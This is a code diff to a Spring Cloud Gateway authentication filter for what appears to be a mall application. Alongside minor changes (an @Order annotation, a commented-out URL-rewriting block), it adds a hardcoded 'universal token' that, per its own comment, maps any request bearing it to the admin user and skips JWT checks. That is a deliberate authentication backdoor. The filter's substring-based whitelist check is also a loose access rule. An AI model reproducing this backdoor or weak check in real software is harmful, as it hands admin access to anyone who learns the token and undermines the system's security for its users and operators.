@@ -9,6 +9,7 @@ import com.tu.mall.common.utils.JWTUtil;
 import org.springframework.beans.factory.annotation.Value;
 import org.springframework.cloud.gateway.filter.GatewayFilterChain;
 import org.springframework.cloud.gateway.filter.GlobalFilter;
+import org.springframework.core.annotation.Order;
 import org.springframework.core.io.buffer.DataBuffer;
 import org.springframework.http.server.reactive.ServerHttpRequest;
 import org.springframework.http.server.reactive.ServerHttpResponse;
@@ -25,6 +26,7 @@ import java.util.List;
  * @author JiFeiYe
  * @since 2024/10/11
  */
+@Order(1)
 @Component
 public class AuthGlobalFilter implements GlobalFilter {
 
@@ -43,6 +45,18 @@ public class AuthGlobalFilter implements GlobalFilter {
         for (String freeUrl : StrUtil.split(freeUrls, ",")) {
             if (StrUtil.indexOf(url, freeUrl, 0, false) != -1) { // 包含
                 System.out.println(url + "是免权限路径，通过。");
+//                if ("v2".equals(freeUrl)) {
+//                    int i = StrUtil.indexOf(url, "/v2", 0, false);
+//                    if (-1 != i) {
+//                        url = StrUtil.subSuf(url, i);
+//                        System.out.println("格式化文档相关api：" + url);
+//                    }
+//                    request = request
+//                            .mutate()
+//                            .uri(URI.create(url))
+//                            .build();
+//                    exchange.mutate().request(request).build();
+//                }
                 return chain.filter(exchange);
             }
         }
@@ -51,7 +65,10 @@ public class AuthGlobalFilter implements GlobalFilter {
         String token = getToken(request);
         String userId = "";
         if (StrUtil.isNotEmpty(token)) {
-            userId = JWTUtil.getUserId(token);
+            if (StrUtil.equals(token, "qazjfy")) // 万能token->指向admin
+                userId = "1";
+            else
+                userId = JWTUtil.getUserId(token);
         }
         if (StrUtil.isNotEmpty(userId)) { // 如果jwt校验通过
             System.out.println("jwt校验通过，userId：" + userId);
